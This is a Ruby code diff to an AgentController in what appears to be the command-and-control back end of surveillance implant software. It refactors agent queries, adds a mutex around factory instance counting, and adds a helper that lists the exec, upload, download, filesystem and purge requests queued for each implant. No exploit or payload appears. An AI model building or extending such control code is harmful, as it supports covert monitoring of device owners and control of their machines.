@@ -12,13 +12,19 @@ module DB
 
 class AgentController < RESTController
   include RCS::Crypt
-  
+
   def index
     require_auth_level :tech, :view
 
     mongoid_query do
-      fields = ["name", "desc", "status", "_kind", "path", "type", "ident", "instance", "version", "platform", "uninstalled", "upgradable", "demo", "scout", "good", "stat.last_sync", "stat.last_sync_status", "stat.user", "stat.device", "stat.source", "stat.size", "stat.grid_size"]
-      agents = ::Item.in(_kind: ['agent', 'factory']).in(deleted: [false, nil]).in(user_ids: [@session.user[:_id]]).only(fields)
+      fields = ["name", "desc", "status", "_kind", "path", "type", "ident", "instance", "version", "platform", "uninstalled",
+                "upgradable", "demo", "scout", "good", "stat.last_sync", "stat.last_sync_status", "stat.user", "stat.device",
+                "stat.source", "stat.size", "stat.grid_size"]
+
+      fields = fields.inject({}) { |h, f| h[f] = 1; h }
+      selector = {'deleted' => {'$in' => [false, nil]}, 'user_ids' => @session.user[:_id], '_kind' => {'$in' => ['agent', 'factory']}}
+      agents = Item.collection.find(selector).select(fields)
+
       ok(agents)
     end
   end
@@ -267,13 +273,13 @@ class AgentController < RESTController
     # request for a specific instance
     if @params['_id']
       Item.where({_kind: 'factory', ident: @params['_id']}).each do |entry|
-          classes[entry[:ident]] = entry[:confkey]
+        classes[entry[:ident]] = {key: entry[:confkey], good: entry[:good]}
       end
     # all of them
     else
       Item.where({_kind: 'factory'}).each do |entry|
-          classes[entry[:ident]] = entry[:confkey]
-        end
+        classes[entry[:ident]] = {key: entry[:confkey], good: entry[:good]}
+      end
     end
     
     return ok(classes)
@@ -332,8 +338,18 @@ class AgentController < RESTController
       return ok(status)
     end
 
-    # search for the factory of that instance
-    factory = Item.where({_kind: 'factory', ident: @params['ident'], status: 'open'}).first
+    factory = nil
+
+    synchronize do
+      # search for the factory of that instance
+      factory = Item.where({_kind: 'factory', ident: @params['ident'], status: 'open'}).first
+
+      if factory && factory.good
+        # increment the instance counter for the factory
+        factory[:counter] += 1
+        factory.save
+      end
+    end
 
     # the status of the factory must be open otherwise no instance can be cloned from it
     return not_found("Factory not found: #{@params['ident']}") if factory.nil?
@@ -341,9 +357,6 @@ class AgentController < RESTController
     # the status of the factory must be open otherwise no instance can be cloned from it
     return not_found("Factory is marked as compromised found: #{@params['ident']}") unless factory.good
 
-    # increment the instance counter for the factory
-    factory[:counter] += 1
-    factory.save
 
     trace :info, "Creating new instance for #{factory[:ident]} (#{factory[:counter]})"
 
@@ -425,6 +438,37 @@ class AgentController < RESTController
 
       return ok(agent)
     end
+  end
+
+  # this methods is an helper to reduce the number of requests the collector
+  # has to perform during the ident phase
+  def availables
+    require_auth_level :server
+
+    agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
+    return not_found("Agent not found: #{@params['_id']}") if agent.nil?
+
+    availables = []
+
+    # config
+    conf = agent.configs.last
+    availables << :config if conf and conf.activated.nil?
+    # purge
+    availables << :purge if agent.purge and agent.purge != [0,0]
+    # uploads
+    availables << :upload if agent.upload_requests.where({sent: 0}).count > 0
+    # upgrade
+    availables << :upgrade if agent.upgrade_requests.count > 0
+    # exec
+    availables << :exec if agent.exec_requests.count > 0
+    # downloads
+    availables << :download if agent.download_requests.count > 0
+    # filesystem
+    availables << :filesystem if agent.filesystem_requests.count > 0
+
+    trace :info, "[#{@request[:peer]}] Availables for #{agent.name} are: #{availables.inspect}" if availables.size > 0
+
+    return ok(availables)
   end
 
   def config
@@ -759,6 +803,12 @@ class AgentController < RESTController
     end
   end
 
+  private
+
+  def synchronize(&block)
+    @@mutext ||= Mutex.new
+    @@mutext.synchronize(&block)
+  end
 end
 
 end #DB::
